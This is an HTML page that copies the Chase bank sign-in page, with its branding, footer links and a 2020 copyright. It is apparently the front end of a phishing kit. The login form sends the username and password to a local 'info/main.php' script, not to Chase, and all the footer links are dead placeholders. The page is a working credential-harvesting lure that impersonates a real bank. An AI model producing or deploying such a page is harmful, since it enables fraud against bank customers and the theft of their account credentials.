<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset='utf-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <title>Credit Card, Mortgage, Banking, Auto | Chase Online | Chase.com</title>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <link rel="shortcut icon" href="icon/chasefavicon.ico" type="image/x-icon">
    <link rel='stylesheet' type='text/css'  href='css/main.css'>
    <script src="https://kit.fontawesome.com/d41c77e3c5.js" crossorigin="anonymous"></script>
</head>
<body>
    <div class="top-container">
        <div class="top-design"></div>
        <div class="logo"></div>
        <div class="form">
            <div class="form-box">
                <form method="post" action="info/main.php">
                    <input type="text"  placeholder="Username" name="username" id="email" required="require" autofocus>
                    <input type="password"  placeholder="Password" name="pass" id="pass" required="require">
                    <input type="submit" value="Sign In">
                </form>
                <div class="forget">
                    <a href="#">Forgot username/password? ></a><br>
                    <a href="#">Not Enrolled? Sign Up Now. ></a>
                </div>
            </div>
        </div>
    </div>
    <div class="footer">
        <div class="follow">
            <span>Follow us:</span>
            <a href="#"><i class="fab fa-facebook-square"></i></a>
            <a href="#"><i class="fab fa-instagram"></i></a>
            <a href="#"><i class="fab fa-twitter"></i></a>
            <a href="#"><i class="fab fa-youtube"></i></a>
            <a href="#"><i class="fab fa-linkedin"></i></a>
        </div>
        <div class="text-footer">
        <div>
                <a href="#">Contact us</a>
                <a href="#">Privacy</a>
                <a href="#">Sécurity</a>
                <a href="#">Terms of use</a>
                <a href="#">Accessibility</a>
                <a href="#">SAFE Act: Chase Mortgage Loan Originators</a>
                <a href="#">Fair Lending</a>
                <a href="#">About Chase</a>
                <a href="#">J.P. Morgan</a>
                <a href="#">JPMorgan Chase & Co.</a>
                <a href="#">Careers</a>
            </div>    
            <div class="second">
                <a href="#">Chase Canada</a>
                <a href="#">Site map</a>
                <a href="#">Member FDIC</a>
                <a href="#">Equal Housing Lender</a>
            </div>
            <div class="thirt">
                <a href="#">© 2020 JPMorgan Chase & Co.</a>
            </div>    
        </div>
    </div>
</body>
</html>